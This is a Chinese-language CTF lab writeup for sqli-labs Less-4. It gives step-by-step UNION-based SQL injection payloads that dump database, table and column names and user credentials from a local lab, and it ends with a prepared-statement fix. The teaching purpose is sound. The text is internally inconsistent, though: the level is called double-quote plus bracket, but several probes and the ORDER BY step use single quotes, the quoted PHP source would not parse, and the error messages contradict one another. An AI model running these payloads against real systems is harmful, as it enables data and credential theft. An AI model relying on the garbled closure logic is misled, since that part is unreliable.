---
layout: post
title: sqli-labs - Less-4 基于错误的 GET 双引号括号型注入 Writeup
platform: sqli-labs
date: 2026-11-10 08:40:00 +0800
categories: CTF
---

sqli-labs - Less-4 基于错误的 GET 双引号括号型注入 Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-4 → Error Based - Double Quotes（双引号 + 括号闭合）
- 地址：`http://127.0.0.1:8080/Less-4/?id=1`
- 题型：Web / SQL 注入
- 考点：**UNION 联合查询 + 注释闭合**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（工作区独立数据目录）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
?id=1              → 正常回显
?id=1"             → You have an error in your SQL syntax; ... near '"1"" ) LIMIT 0,1'
?id=1" --+     → 正常回显（注释闭合成功）
```

二、题目分析

**① 正常请求长什么样**

```text
http://127.0.0.1:8080/Less-4/?id=1
→ Your Login name:Dumb
→ Your Password:Dumb
```

**★ 页面直接把 users 表的 username / password 打印出来 → 有回显，优先 UNION。**

**② 源码（关键三行）**

```php
$sql = "SELECT * FROM users WHERE id=("$id") LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
echo "Your Login name:" . $row['username'];
echo "Your Password:" . $row['password'];
```

**③ id 被 (") 包住 → 双引号 + 右括号要闭合**

- 拼进 SQL 的参数没有任何过滤 → 直接注入
- 页面回显 username / password 两列 → 用 UNION 把想查的数据放到这两个位置

**④ 怎么判断闭合方式**

```text
先发 ?id=1'   → 报错  You have an error in your SQL syntax; ... near '"1"" ) LIMIT 0,1'
再发 ?id=1' --+ → 正常回显  ⇒ 说明单引号是要闭合的，--+ 用来注释掉原句剩下的部分
```

**★ 报错信息里的 `near ''1'' LIMIT 0,1'` 就是在告诉你：你的引号把 SQL 拆坏了，末尾还剩一个 `'`。**

三、解题步骤

**第一步：判断列数（ORDER BY / UNION）**

```text
?id=1' order by 3 --+   → 正常
?id=1' order by 4 --+   → 报错  ⇒ 总共 3 列
```

或者直接试 `-1") union select 1,2,3 --+`，能回显就说明列数对上了。

**第二步：找显示位**

```text
-1") union select 1,2,3 --+
→ Your Login name:2   Your Password:3
```

**★ 用 `-1` 让主查询查不到数据，页面就只会显示 UNION 后半段注入进去的 2、3 —— 这两个位置就是"显示位"。**

**第三步：爆库**

```text
-1") union select 1,database(),3 --+
→ Login name:security
```

**第四步：爆表**

```text
-1") union select 1,convert(group_concat(table_name) using latin1),3 from information_schema.tables where table_schema=database() --+
→ Login name:emails,referers,uagents,users
```

**★ 如果报 `Illegal mix of collations`，在 information_schema 的列上加 `convert(... using latin1)` 即可（本机实测必须加）。**

**第五步：爆字段**

```text
-1") union select 1,convert(group_concat(column_name) using latin1),3 from information_schema.columns where table_schema=database() and table_name='users' --+
→ Login name:id,username,password
```

**第六步：爆数据**

```text
-1") union select 1,group_concat(username,0x3a,password),3 from users --+
→ Login name:Dumb:Dumb,...,admin:admin
```

**✅ 到这里 users 表 8 条账号全部拿到。**

四、延伸知识

**① 注释的三种写法**

```text
--+     → URL 里 + 会被解成空格，等价于 "-- "（最常用）
#       → 也可以，但 # 在 URL 里要编码成 %23
/**/    → 行内注释，绕过一些关键字过滤
```

**② 为什么用 `-1` 而不是 `1`**

```text
?id=1' union select 1,2,3 --+   → 主查询先查到 id=1 这行，页面只显示第一行 → 看不到 2、3
?id=-1' union select 1,2,3 --+  → 主查询查不到任何行 → 页面显示 UNION 的结果 → 看到 2、3
```

**③ `information_schema` 是什么**

```text
MySQL 自带的"元数据库"，所有库/表/字段名都记在里面：
  information_schema.tables      → table_schema / table_name
  information_schema.columns     → table_schema / table_name / column_name
★ MySQL 5.0 以上都有，是 SQL 注入里"爆表爆字段"的标配
```

**④ 常见坑：Illegal mix of collations**

```text
UNION 时如果两边字符集排序规则不一致，会报：
Illegal mix of collations for operation 'UNION'

解决：把 information_schema 的列转成目标库的字符集
  convert(group_concat(table_name) using latin1)
```

**⑤ 修复建议（写代码的人该怎么做）**

```php
// ❌ 错误写法
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";

// ✅ 正确写法（预处理 + 参数绑定）
$stmt = $pdo->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
$stmt->execute([$id]);

// ✅ 或者至少做类型转换（数字型）
$id = intval($_GET['id']);
```

**★ 只要用了预处理，引号、括号、注释这些花招全部失效 —— 本关的注入点就不存在了。**

五、总结

- **本题核心：字符串型注入缺口 → 注释闭合 → UNION 把数据放到显示位。**

- 三步方法论：

```text
① 判断闭合方式（" → 报错 → " + 注释 → 正常）
② 判断列数（order by / union select 1,2,3）
③ UNION 回显：把库名/表名/字段/数据依次放到显示位
```

- **三个必记要点**：

```text
① UNION 前后列数必须一致，否则报错
② 用 -1 让主查询落空，才能真正看到 UNION 的结果
③ information_schema 是爆库爆表的关键
```

- **实测数据**：

```text
库名：security
表名：emails, referers, uagents, users
字段：id, username, password
数据：Dumb:Dumb, Angelina:I-kill-you, ..., admin:admin
```

**手工复现要点**：

```text
· 浏览器直接改 URL 就行，不用抓包
· 先把 " 加上看报错，再加 --+ 看是否闭合
· 用 order by 猜列数，union select 1,2,3 找显示位
· 依次爆库 → 爆表 → 爆字段 → 爆数据
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  字符型注入 = 先闭合引号，再注释掉多余部分，最后 UNION 回显  │
│                                                        │
│  判断口诀：                                             │
│      "  → 报错 → 说明有注入                            │
│      " + --+ → 正常 → 说明闭合成功                     │
│                                                        │
│  ★ 修复 = 预处理（参数绑定），一句话解决所有注入           │
└────────────────────────────────────────────────────────┘
```
